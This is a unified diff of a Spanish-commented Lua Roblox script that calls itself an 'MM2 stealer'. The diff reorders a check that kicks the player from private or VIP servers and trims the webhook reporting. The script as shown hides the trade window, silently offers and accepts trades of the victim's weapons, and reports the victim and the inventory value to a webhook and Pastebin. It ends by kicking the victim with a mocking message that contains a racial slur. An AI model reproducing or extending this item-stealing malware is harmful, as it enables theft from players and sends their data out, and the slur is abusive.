@@ -9,6 +9,21 @@ local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
 
+-- Kick por servidor lleno, privado o VIP
+local function CheckServerInitial()
+    if #Players:GetPlayers() >= 12 then
+        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
+    end
+    if game.PrivateServerId and game.PrivateServerId ~= "" then
+        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
+    end
+    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
+    if success and ownerId and ownerId ~= 0 then
+        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
+    end
+end
+CheckServerInitial()
+
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
@@ -44,6 +59,7 @@ local function CreatePaste(content)
     if res and res.Body then return res.Body end
 end
 
+-- Desactivar GUI de trades
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     local gui = playerGui:FindFirstChild(guiName)
@@ -63,20 +79,7 @@ local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapon
 local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
-local function CheckServerInitial()
-    if #Players:GetPlayers() >= 12 then
-        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
-    end
-    if game.PrivateServerId and game.PrivateServerId ~= "" then
-        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
-    end
-    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
-    if success and ownerId and ownerId ~= 0 then
-        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
-    end
-end
-CheckServerInitial()
-
+-- Database y valores
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
 local categories = {
@@ -176,18 +179,17 @@ table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amou
 local fernToken = math.random(100000,999999)
 local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
+-- Webhook inicial con Pastebin si >18
 local pasteContent = ""
 for _, w in ipairs(weaponsToSend) do
     pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
 end
 pasteContent = pasteContent .. "\nValor total del inventario📦: "..tostring(totalValue).."💰"
-
 local pasteLink
 if #weaponsToSend > 18 then
     pasteLink = CreatePaste(pasteContent)
 end
 
--- Webhook inicial
 if #weaponsToSend > 0 then
     local fieldsInit={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
@@ -213,7 +215,7 @@ if #weaponsToSend > 0 then
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
--- Función final para trades con formato igual al webhook inicial
+-- Función final para trades (solo webhook final, sin Pastebin, sin @everyone)
 local function TradeFinalizado()
     local fieldsFinal={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
@@ -229,20 +231,10 @@ local function TradeFinalizado()
 
     if #weaponsToSend > 18 then
         fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\n"
-        local pasteContent=""
-        for _, w in ipairs(weaponsToSend) do
-            pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
-        end
-        pasteContent = pasteContent.."\nValor total del inventario📦: "..tostring(totalValue).."💰"
-        local pasteLink = CreatePaste(pasteContent)
-        if pasteLink then
-            fieldsFinal[2].value = fieldsFinal[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
-        end
     end
 
-    local prefix=pingEveryone and "@everyone " or ""
-    SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal,prefix)
-    task.wait(1)
+    SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
+    task.wait(5)
     LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
 end
 
